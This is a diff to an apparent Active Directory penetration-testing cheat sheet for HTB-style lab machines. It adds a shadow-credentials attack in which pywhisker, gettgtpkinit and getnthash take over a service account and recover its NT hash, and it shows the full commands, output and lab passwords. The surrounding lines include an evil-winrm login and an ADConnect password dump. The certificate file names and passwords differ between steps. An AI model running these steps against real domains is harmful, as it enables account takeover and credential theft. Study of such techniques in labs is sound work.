@@ -475,6 +475,44 @@ evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$" -s .
 adconnect.ps1
 Get-ADConnectPassword
 ```
+###### Shadow Credential Attack
+```
+python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
+[*] Searching for the target account
+[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 05521294-1c22-cd5e-9836-5d22c2074ba7
+[*] Updating the msDS-KeyCredentialLink attribute of management_svc
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[+] Saved PFX (#PKCS12) certificate & key at path: g17jPEmM.pfx
+[*] Must be used with password: TBwxEdb3kfdFrnTrYLb7
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+
+python gettgtpkinit.py -cert-pfx t0cZeyin.pfx -pfx-pass Ryk4iT9K3g7uEgqSfFG1 certified.htb/management_svc management_svc.ccache
+2025-02-05 10:13:39,724 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-02-05 10:13:39,732 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+
+
+2025-02-05 10:14:36,995 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-02-05 10:14:36,996 minikerberos INFO     1dde55cc8c3ee35511712e96382fd98c8b8c096506601a57901a9e3949763db6
+INFO:minikerberos:1dde55cc8c3ee35511712e96382fd98c8b8c096506601a57901a9e3949763db6
+2025-02-05 10:14:36,997 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+
+export KRB5CCNAME=management_svc.ccache
+└─$ python3 ./PKINITtools/getnthash.py -key 1dde55cc8c3ee35511712e96382fd98c8b8c096506601a57901a9e3949763db6 certified.htb/management_svc
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash
+a091c1832bcdd4677c28b5a6a1295584
+```
 
 ### Persistence
 #### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
